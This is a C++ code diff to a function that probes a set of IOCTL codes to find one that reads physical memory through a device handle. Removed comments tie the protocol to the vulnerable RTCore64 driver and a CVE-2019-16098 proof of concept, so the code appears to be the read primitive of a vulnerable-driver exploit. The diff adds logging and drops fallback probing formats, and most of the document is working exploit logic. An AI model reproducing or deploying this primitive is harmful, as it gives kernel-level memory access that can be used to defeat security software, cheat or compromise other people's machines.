@@ -439,20 +439,9 @@ namespace sky::driver {
     static bool s_ioctl_tested = false;
 
     // Test which IOCTL code works by reading a known physical address
-    // Physical address 0x1000 should contain either MZ (boot sector) or zero
     static bool test_rtc_ioctl() {
         if (s_ioctl_tested) return s_ioctl_read != 0;
         s_ioctl_tested = true;
-
-        // RTCore64 uses the following protocol (verified from CVE-2019-16098 PoC):
-        // IOCTL 0x9C40258C - Read physical memory
-        // Input/Output buffer: struct {
-        //   BYTE  Padding[8];      // [0..7]   unused
-        //   ULONG_PTR Address;     // [8..15]  physical address
-        //   BYTE  Data[];           // [16..]   for read: output data follows
-        // }
-        // The DeviceIoControl returns TRUE even if returned=0
-        // The driver writes data directly starting at offset 16 of the same buffer
 
         DWORD codes[] = { 0x9C40258C, 0x9C402580, 0x9C406000, 0x9C40609C,
                           0x222400, 0x222004, 0x9C402400 };
@@ -461,99 +450,62 @@ namespace sky::driver {
             uint8_t buf[0x1000] = {};
             DWORD returned = 0;
 
-            // Format A: RTCore64 standard — 16-byte header + data
-            // [8 padding][8 address][rest = output]
+            // Format A: [8 padding][8 address] single buffer
             {
-                memset(buf, 0, sizeof(buf));
                 uint64_t* p = (uint64_t*)buf;
-                p[0] = 0;           // padding
-                p[1] = 0x1000;      // physical address to read
+                p[0] = 0;
+                p[1] = 0x1000;
 
-                if (DeviceIoControl(g_hwinfo_device, code,
-                    buf, 16 + 0x100,  // input: 16 header + space for output
-                    buf, 16 + 0x100,  // output: same buffer, enough room for data
-                    &returned, nullptr)) {
-                    // Check if we got non-zero data at offset 16
+                BOOL ok = DeviceIoControl(g_hwinfo_device, code,
+                    buf, 16 + 0x100,
+                    buf, 16 + 0x100,
+                    &returned, nullptr);
+
+                if (!ok) {
+                    DWORD err = GetLastError();
+                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                        " Format A failed (GetLastError=" + std::to_string(err) + ")");
+                } else {
                     uint8_t* data = buf + 16;
                     bool has_data = false;
                     for (int i = 0; i < 16; i++) {
                         if (data[i] != 0) { has_data = true; break; }
                     }
+                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                        " Format A ok (returned=" + std::to_string(returned) +
+                        " has_data=" + (has_data ? "yes" : "no") + ")");
                     if (has_data || returned > 16) {
                         s_ioctl_read = code;
-                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                            " (header+data) works (returned=" + std::to_string(returned) + ")");
                         return true;
                     }
                 }
             }
 
-            // Format B: Just address (8 bytes input, separate output buffer)
+            // Format B: just address (8 bytes)
             {
                 uint64_t addr = 0x1000;
                 uint8_t out[0x100] = {};
-                if (DeviceIoControl(g_hwinfo_device, code,
+                BOOL ok = DeviceIoControl(g_hwinfo_device, code,
                     &addr, sizeof(addr),
                     out, sizeof(out),
-                    &returned, nullptr)) {
+                    &returned, nullptr);
+
+                if (!ok) {
+                    DWORD err = GetLastError();
+                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                        " Format B failed (GetLastError=" + std::to_string(err) + ")");
+                } else {
                     bool has_data = false;
                     for (int i = 0; i < 16; i++) {
                         if (out[i] != 0) { has_data = true; break; }
                     }
-                    if (has_data || returned > 0) {
-                        s_ioctl_read = code;
-                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                            " (addr-only) works (returned=" + std::to_string(returned) + ")");
-                        return true;
-                    }
-                }
-            }
-
-            // Format C: [8 padding][8 address][4 size] (20 bytes input)
-            {
-                memset(buf, 0, sizeof(buf));
-                uint64_t* p = (uint64_t*)buf;
-                p[0] = 0;           // padding
-                p[1] = 0x1000;      // physical address
-                *(uint32_t*)(buf + 16) = 0x100;  // size
-
-                if (DeviceIoControl(g_hwinfo_device, code,
-                    buf, 20,
-                    buf, 0x200,
-                    &returned, nullptr)) {
-                    bool has_data = false;
-                    for (int i = 0; i < 16; i++) {
-                        if (buf[i] != 0) { has_data = true; break; }
-                    }
-                    if (has_data || returned > 0) {
-                        s_ioctl_read = code;
-                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                            " (pad+addr+size) works (returned=" + std::to_string(returned) + ")");
-                        return true;
-                    }
-                }
-            }
-        }
-
-        // Last resort: try every IOCTL even if returned=0 (driver might use METHOD_NEITHER)
-        for (auto code : codes) {
-            uint8_t buf[0x1000] = {};
-            uint64_t addr = 0x1000;
-            DWORD returned = 0;
-            if (DeviceIoControl(g_hwinfo_device, code,
-                &addr, sizeof(addr),
-                buf, 0x1000,
-                &returned, nullptr)) {
-                // Even if returned=0, check if the buffer got data
-                bool has_data = false;
-                for (int i = 0; i < 64; i++) {
-                    if (buf[i] != 0) { has_data = true; break; }
-                }
-                if (has_data) {
-                    s_ioctl_read = code;
                     LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " (METHOD_NEITHER) works (buffer has data)");
-                    return true;
+                        " Format B ok (returned=" + std::to_string(returned) +
+                        " has_data=" + (has_data ? "yes" : "no") + ")");
+                    if (has_data || returned > 0) {
+                        s_ioctl_read = code;
+                        return true;
+                    }
                 }
             }
         }
